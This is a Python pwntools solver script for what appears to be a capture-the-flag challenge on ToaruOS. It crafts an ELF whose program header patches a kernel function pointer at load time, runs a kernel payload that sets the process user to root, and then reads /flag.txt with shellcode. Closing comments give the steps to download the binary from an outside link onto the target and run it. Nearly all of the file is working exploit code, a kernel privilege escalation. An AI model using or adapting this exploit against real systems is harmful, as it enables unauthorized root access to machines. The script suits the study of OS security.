from pwn import *

context.arch = "amd64"

# see https://github.com/klange/toaruos/blob/v2.2.0/kernel/arch/x86_64/user.c#L278-L284
SYSCALL_ARG_REGS = ["rbx", "rcx", "rdx", "rsi", "rdi"]
def syscall(num, *args):
    assert len(args) <= 5
    code = f"mov eax, {num}\n"
    for i, arg in enumerate(args):
        code += f"mov {SYSCALL_ARG_REGS[i]}, {arg}\n"
    # see https://github.com/klange/toaruos/blob/master/kernel/arch/x86_64/idt.c#L630
    code += "int 0x7f\n"
    return code

# see https://github.com/klange/toaruos/blob/v2.2.0/base/usr/include/syscall_nums.h
SYS_EXIT, SYS_OPEN, SYS_READ, SYS_WRITE, SYS_SYSFUNC = 0, 2, 3, 4, 43
# see https://github.com/klange/toaruos/blob/v2.2.0/base/usr/include/sys/sysfunc.h#L13
TOARU_SYS_FUNC_SYNC = 3
# This userspace payload calls the `SYS_SYSFUNC` with `TOARU_SYS_FUNC_SYNC`
# to get the kernel to run our kernel payload. It then reads the flag as normal,
# since our kernel payload would have escalated the process to root.
userspace_payload = asm(f"""
    {syscall(SYS_SYSFUNC, TOARU_SYS_FUNC_SYNC)}
    {shellcraft.pushstr("/flag.txt")}
    {syscall(SYS_OPEN, "rsp", constants.O_RDONLY, 0)}
    mov r12, rax
    {syscall(SYS_READ, "r12", "rsp", 256)}
    mov r12, rax
    {syscall(SYS_WRITE, constants.STDOUT_FILENO, "rsp", "r12")}
    {syscall(SYS_EXIT, 0)}
""")

# `this_core->current_process` is first entry[1] in gs[2] and 28 is the offset
# for the `user` pointer within the current_process struct
# [1] https://github.com/klange/toaruos/blob/v2.2.0/base/usr/include/kernel/process.h#L172
# [2] https://github.com/klange/toaruos/blob/v2.2.0/base/usr/include/kernel/process.h#L232
# so the payload here just sets user to 0 (root)
kernel_payload = asm("""
    mov rdi, gs:[0x0]
    mov QWORD PTR [rdi + 28], 0
    ret
""")

# Thankfully ELFs made with pwntools' `make_elf` work on ToaruOS.
elf_path = make_elf(userspace_payload + kernel_payload, extract=False)
prog = ELF(elf_path)
# Luck is further on our side, as the ELF has a `PT_GNU_STACK` segment
# that ToaruOS doesn't need to actually execute the executable.
# So we can use this header to set up our printf_output patching
seg_idx = [s.header.p_type for s in prog.segments].index("PT_GNU_STACK")
phdr_ofs = prog._segment_offset(seg_idx)
# set up the `phdr` such that it patches `printf_output`
# at ELF load time to point to our `kernel_payload`
phdr = elf.Elf64_Phdr()
phdr.p_type = elf.constants.PT_LOAD
# file offset to this phdr's `p_addr`
phdr.p_offset = phdr_ofs + elf.Elf64_Phdr.p_paddr.offset
# can be obtained with `sudo cat /proc/kallsyms` on a vanilla local build where
# the local user password isn't lost? or maybe I attached a debugger on the
# vanilla local build... forgot what I did in particular tbh...
printf_output = 0x134070
phdr.p_vaddr = printf_output
# `p_addr` points to kernel_payload in virtual memory
phdr.p_paddr = prog.entry + len(userspace_payload)
# only need to patch a pointer, which is 8 bytes in x86_64
phdr.p_filesz = 8
phdr.p_memsz = 0
prog.write(prog.offset_to_vaddr(phdr_ofs), bytes(phdr))
prog.save("solver")

# upload `solver` online somewhere
# connect to challenge
# fetch -O <link to solver>
# chmod +x solver
# ./solver